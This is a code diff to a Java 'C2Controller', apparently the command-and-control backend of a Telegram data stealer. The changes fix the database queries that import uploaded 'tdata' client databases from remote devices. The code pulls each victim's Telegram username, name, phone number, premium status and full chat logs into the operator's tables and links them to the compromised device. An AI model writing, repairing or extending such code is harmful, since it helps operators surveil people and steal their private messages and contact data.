@@ -1173,7 +1173,8 @@ public class C2Controller {
 
             // Update task status if taskId is provided (fixes "waiting" status)
             if (taskId != null) {
-                C2Task task = c2TaskMapper.selectOne(new QueryWrapper<C2Task>().eq("taskId", taskId));
+                // Use task_id column explicitly
+                C2Task task = c2TaskMapper.selectOne(new QueryWrapper<C2Task>().eq("task_id", taskId));
                 if (task != null) {
                     task.setStatus("completed");
                     task.setResult("File uploaded: " + filename);
@@ -1344,6 +1345,66 @@ public class C2Controller {
                     log.warn("Failed to process installed_software: {}", e.getMessage());
                 }
 
+                // 3.5 Process Current User Info (to get TGID if missing)
+                String currentUserTgId = null;
+                try {
+                     // Check if current_user table exists
+                     boolean hasCurrentUser = false;
+                     try {
+                         stmt.executeQuery("SELECT 1 FROM current_user LIMIT 1").close();
+                         hasCurrentUser = true;
+                     } catch (Exception ignore) {}
+
+                     if (hasCurrentUser) {
+                         java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM current_user LIMIT 1");
+                         if (rs.next()) {
+                             String username = rs.getString("username");
+                             String firstName = rs.getString("first_name");
+                             String lastName = rs.getString("last_name");
+                             String phone = rs.getString("phone");
+                             int isPremium = rs.getInt("is_premium");
+                             
+                             // Try to get ID if available (some versions have id or user_id)
+                             try {
+                                 currentUserTgId = rs.getString("id");
+                             } catch (Exception ignore) {
+                                 try { currentUserTgId = rs.getString("user_id"); } catch (Exception ignore2) {}
+                             }
+                             
+                             if (currentUserTgId != null) {
+                                 // Update or Create TgAccount
+                                 TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tg_id", currentUserTgId));
+                                 if (account == null) {
+                                     account = new TgAccount();
+                                     account.setTgId(currentUserTgId);
+                                     account.setCreateTime(new Date());
+                                     account.setIsDelete(0);
+                                     tgAccountMapper.insert(account);
+                                 }
+                                 
+                                 account.setUsername(username);
+                                 account.setFirstName(firstName);
+                                 account.setLastName(lastName);
+                                 account.setPhone(phone);
+                                 account.setIsPremium(isPremium);
+                                 account.setUpdateTime(new Date());
+                                 
+                                 tgAccountMapper.updateById(account);
+                                 log.info("Updated TgAccount info for TGID: {}", currentUserTgId);
+                                 
+                                 // Update C2Device with currentTgId
+                                 if (device != null) {
+                                     device.setCurrentTgId(currentUserTgId);
+                                     c2DeviceMapper.updateById(device);
+                                 }
+                             }
+                         }
+                         rs.close();
+                     }
+                } catch (Exception e) {
+                     log.warn("Failed to process current_user: " + e.getMessage());
+                }
+
                 // 4. Process Chat Logs
                 try {
                     // Extract TG ID from filename (tdata_client_TGID.db)
@@ -1352,10 +1413,15 @@ public class C2Controller {
                         String temp = originalFilename.substring("tdata_client_".length());
                         tgId = temp.substring(0, temp.length() - 3); // Remove .db
                     }
+                    
+                    // Fallback to current_user ID if filename didn't have it
+                    if ((tgId == null || tgId.isEmpty()) && currentUserTgId != null) {
+                        tgId = currentUserTgId;
+                    }
 
                     if (tgId != null && !tgId.isEmpty()) {
                         // Find or Create TgAccount
-                        TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tgId", tgId));
+                        TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tg_id", tgId));
                         if (account == null) {
                             account = new TgAccount();
                             account.setTgId(tgId);
@@ -1401,13 +1467,6 @@ public class C2Controller {
                                 try { receiverPhone = rs.getString("receiver_phone"); } catch (Exception ignore) {}
                                 try { mediaPath = rs.getString("media_path"); } catch (Exception ignore) {}
                                 
-                                // Simple deduplication: check if message exists by content & time & chatId & accountId
-                                // Note: This is expensive for many messages. Ideally use msgId if available.
-                                // Schema doesn't have msgId in chat_logs (based on README).
-                                // But TgMessage has msgId.
-                                // We'll use hash or just insert.
-                                // Let's check if we can use timestamp as unique key for now? No.
-                                
                                 TgMessage msg = new TgMessage();
                                 msg.setAccountId(accountId);
                                 msg.setChatId(chatId);
@@ -1426,11 +1485,11 @@ public class C2Controller {
                                 msg.setReceiverPhone(receiverPhone);
                                 msg.setMediaPath(mediaPath);
                                 
-                                // Check duplicate
+                                // Check duplicate using snake_case columns
                                 QueryWrapper<TgMessage> dup = new QueryWrapper<>();
-                                dup.eq("accountId", accountId)
-                                   .eq("chatId", chatId)
-                                   .eq("msgDate", msg.getMsgDate())
+                                dup.eq("account_id", accountId)
+                                   .eq("chat_id", chatId)
+                                   .eq("msg_date", msg.getMsgDate())
                                    .eq("content", content);
                                    
                                 if (tgMessageMapper.selectCount(dup) == 0) {
@@ -1442,37 +1501,7 @@ public class C2Controller {
                             log.info("Imported {} chat logs for TGID: {}", count, tgId);
                         }
                         
-                        // Process Current User Info (Update TgAccount)
-                        try {
-                             java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM current_user LIMIT 1");
-                             if (rs.next()) {
-                                 String username = rs.getString("username");
-                                 String firstName = rs.getString("first_name");
-                                 String lastName = rs.getString("last_name");
-                                 String phone = rs.getString("phone");
-                                 int isPremium = rs.getInt("is_premium");
-                                 
-                                 account.setUsername(username);
-                                 account.setFirstName(firstName);
-                                 account.setLastName(lastName);
-                                 account.setPhone(phone);
-                                 account.setIsPremium(isPremium);
-                                 account.setUpdateTime(new Date());
-                                 
-                                 tgAccountMapper.updateById(account);
-                                 log.info("Updated TgAccount info for TGID: {}", tgId);
-                                 
-                                 // Update C2Device with currentTgId
-                                 if (device != null) {
-                                     device.setCurrentTgId(tgId);
-                                     c2DeviceMapper.updateById(device);
-                                 }
-                             }
-                             rs.close();
-                        } catch (Exception e) {
-                             // Table might not exist yet in older DBs
-                             // log.warn("Failed to process current_user: " + e.getMessage());
-                        }
+                        // (Old current_user logic removed from here)
 
                     }
                 } catch (Exception e) {
